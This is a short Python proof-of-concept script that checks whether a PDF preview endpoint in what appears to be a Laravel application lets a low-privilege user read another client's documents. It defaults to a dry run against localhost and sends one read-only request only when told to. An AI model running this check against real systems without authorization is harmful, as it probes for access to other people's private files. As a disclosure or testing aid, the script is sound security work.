#!/usr/bin/env python3
"""Safe-by-default PoC scaffold for cross-client document authorization."""

import argparse
import urllib.error
import urllib.request


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8000")
    parser.add_argument("--file-id", type=int, required=True)
    parser.add_argument("--session-cookie", help="Authenticated low-privilege Laravel session cookie")
    parser.add_argument("--execute", action="store_true", help="Perform one read-only preview request")
    args = parser.parse_args()
    url = f"{args.base_url.rstrip('/')}/PDF/file/{args.file_id}/preview"

    print("1. Prerequisite: use a non-admin, non-Multimedia account without access to the target client.")
    print(f"2. Read-only trigger: GET {url}")
    print("3. Secure result should be 403/404; vulnerable result is 200 with PDF content.")
    print("4. No cleanup is required because this PoC performs no mutation.")
    if not args.execute:
        print("Dry run only. Add --execute and --session-cookie to send the request.")
        return
    if not args.session_cookie:
        parser.error("--session-cookie is required with --execute")

    request = urllib.request.Request(url, headers={"Cookie": args.session_cookie, "Accept": "application/pdf"})
    try:
        with urllib.request.urlopen(request, timeout=15) as response:
            print(f"HTTP {response.status}; content-type={response.headers.get('Content-Type')}")
    except urllib.error.HTTPError as error:
        print(f"HTTP {error.code}")


if __name__ == "__main__":
    main()
